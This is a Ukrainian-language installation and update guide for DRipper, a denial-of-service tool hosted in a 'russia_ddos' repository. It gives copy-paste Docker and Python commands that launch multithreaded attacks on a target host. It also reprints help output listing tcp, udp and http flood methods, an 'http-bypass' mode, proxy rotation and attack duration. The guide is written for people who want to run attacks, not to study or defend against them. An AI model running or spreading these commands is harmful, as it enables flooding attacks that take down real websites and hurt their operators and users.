# Як встановити та оновити DRipper

**DRipper** можна запустити двома спосбами - в docker або як python скрипт. Якщо порівнювати ці способи запуску, то запуск напряму через Python буде більш ефективнішим по використанню ресурсів Вашого ПК. А docker - це ізольване середовище, де вам нічого не потрібно встановлювати і налаштовувати, але ресурсів, Docker, використовує в рази більше.

## Що треба встановити попередньо

Для запуску в Docker, Вам потрібно попередньо встановити Docker для Вашої операційної ситеми.
Для запуску як python скрипт Вам порібно встановити Python 3.9 (або версію више) та Git.

### Запуск через Docker

Для запуску через Docker вам потрібно запустити термінал (PowerShell для Windows, Bash для macOS, Linux) і просто запустити команду.

**Windows PowerShell**
```powershell
PS C:\> docker run -it --rm --pull=always alexmon1989/dripper:latest -t 200 -s tcp://site1.com:80
```

**macOS/Linux Bash**
```bash
$ docker run -it --rm --pull=always alexmon1989/dripper:latest -t 200 -s tcp://site1.com:80
```

Ці команди однакові, вони завантажать **docker image** останньої версії та запустять атаку, відповідно до вказаних параметрів.
В данному прикладі, параметри атакі, це: **-t 200 -s tcp://site1.com:80**, де **-t 200** - кількість потоків, **-s tcp://site1.com:80** - ціль

---

### Запуск Python скрипта

Якщо Ви ще не встановлювали **DRipper**, то Вам потрібно завантажити актуальну версію та встановити всі необходні бібліотеки для роботи скрипта, це дуже просто.

Запускаємо термінал (PowerShell для Windows, Bash для macOS/Linux), та переходимо до директорії (папка), куди будуть завантажені файли скрипта, наприклад:

**Windows PowerShell**
```powershell
# Створимо папку dripper в корні диска С:
PS C:\> mkdir C:\dripper
# Перейдемо в папку де будуть завантажений dripper
PS C:\> cd C:\dripper

# Завантажуємо актуальну версію з git репозиторію
PS: C:\dripper\> git clone https://github.com/alexmon1989/russia_ddos
PS: C:\dripper\> cd russia_ddos

## Встановлюємо всі необхідні бібліотеки
PS: C:\dripper\russia_ddos\> python3 -m pip install -r requirements.txt

## Запуск скрипта
PS: C:\dripper\russia_ddos\> python3 DRipper.py -t 200 -s tcp://site1.com:80
```

**macOS/Linux Bash**
```bash
# Створимо папку dripper в директорії користувача (Home folder)
~ $ mkdir ~/dripper
# Перейдемо в папку де будуть завантажений dripper
~ $ cd ~/dripper

# Завантажуємо актуальну версію з git репозиторію
~/dripper $ git clone https://github.com/alexmon1989/russia_ddos
~/dripper $ cd russia_ddos

## Встановлюємо всі необхідні бібліотеки
~/dripper/russia_ddos $ python3 -m pip install -r requirements.txt

## Запуск скрипта
~/dripper/russia_ddos $ python3 DRipper.py -t 200 -s tcp://site1.com:80
```

---

## Оновлення DRipper

### Для **Docker** можна використати декілька способів:

- Завжди використовувати тег `latest`, при цьому додати `--pull=always`, наприклад: `--pull=always alexmon1989/dripper:latest`
- Використовувати **docker image** з новою версією, явно вказавши версію, наприклад: `alexmon1989/dripper:2.5.0`

### Розглянемо на прикладах:

Припустімо, що у Вас зараз версія **2.4.0** і Ви бажаєте оновити до останньої **2.5.0**, використовуючи **Docker**

```bash
# Оновлення до актуальної версії, використовуючи тег latest
docker run -it --rm --pull=always alexmon1989/dripper:latest --version

# Оновлення до актуальної версії, використовуючи версію як тег
docker run -it --rm alexmon1989/dripper:2.5.0 --version
```

Загалом, стратегія оновлення дуже проста, Ви можете використовувати нову версію, як тільки вона вийде, просто написавши версію в якості тега. Або час від часу, наприклад раз на тиждень, додавати `--pull=always` до команди запуску в докері, якщо Ви використовуєте тег `latest`


### Для Python оновлення дуже просте

Для оновлення, треба просто завантажити за допомогою **git** останні зміни і повторно запустити встановлення бібліотек. Для цього Вам треба в терміналі перейти в директорію зі скриптом і виконати всього дві команди:

```bash
cd russia_ddos

git pull

python3 -m pip install -r requirements.txt
```

Після цього Ви можете запускати команди і виконувати атаки.

---

## Допомога з параметрами скрипта

Якщо Ви не знаєте які параметри у скрипта і на що вони впливають, завжди можна запустити команду `--help` і подивитися детально який параметр і для чого використовується, наприклад:

```bash
# Docker
docker run -it --rm alexmon1989/dripper:latest --help

# Python
python3 DRipper.py --help

# Приклад виводу команди --help:
Usage: DRipper.py [options] arg

Options:
  --version                                             show program's version number and exit
  -h, --help                                            show this help message and exit
  -s TARGETS, --targets=TARGETS                         Attack target in {scheme}://{hostname}[:{port}][{path}] format.
                                                        Multiple targets allowed.
  -m ATTACK_METHOD, --method=ATTACK_METHOD              Attack method: udp-flood, tcp-flood, http-flood, http-bypass
  -e HTTP_METHOD, --http-method=HTTP_METHOD             HTTP method. Default: GET
  -t THREADS_COUNT, --threads=THREADS_COUNT             Total threads count. Default: 100
  -r RANDOM_PACKET_LEN, --random-len=RANDOM_PACKET_LEN  Send random packets with random length. Default: 1
  -l MAX_RANDOM_PACKET_LEN, --max-random_packet-len=MAX_RANDOM_PACKET_LEN
                                                        Max random packets length. Default: 1024 for udp/tcp
  -y PROXY_LIST, --proxy-list=PROXY_LIST                File (fs or http/https) with proxies in
                                                        ip:port:username:password line format. Proxies will be ignored
                                                        in udp attack!
  -k PROXY_TYPE, --proxy-type=PROXY_TYPE                Type of proxy to work with. Supported types: socks5, socks4,
                                                        http. Default: socks5
  -c HEALTH_CHECK, --health-check=HEALTH_CHECK          Controls health check availability. Turn on: 1, turn off: 0.
                                                        Default: 1
  -o SOCKET_TIMEOUT, --socket-timeout=SOCKET_TIMEOUT    Timeout for socket connection is seconds. Default (seconds): 1
                                                        without proxy, 2 with proxy
  --dry-run                                             Print formatted output without full script running.
  --log-size=LOG_SIZE                                   Set the Events Log history frame length.
  --log-level=EVENT_LEVEL                               Log level for events board. Supported levels: info, warn, error,
                                                        none.
  -d DURATION, --duration=DURATION                      Attack duration in seconds. After this duration script will stop
                                                        it's execution.

Example: dripper -t 100 -m tcp-flood -s tcp://192.168.0.1:80
```

---

## Як дізнатися, що нового в тій чи іншій версії

Для тих, хто використовує запуск скрипта напряму через Python - Ви завжди маєте всю кодову базу разом з історією змін (CHANGELOG.md). Файл текстовий, його можна відкрити за допомогою будь-якого текстового редактора і подивитися детальну історію змін. Або просто перейдіть за посиланням, та подивіться на історію змін онлайн - [CHANGELOG.md](https://github.com/alexmon1989/russia_ddos/blob/main/CHANGELOG.md)
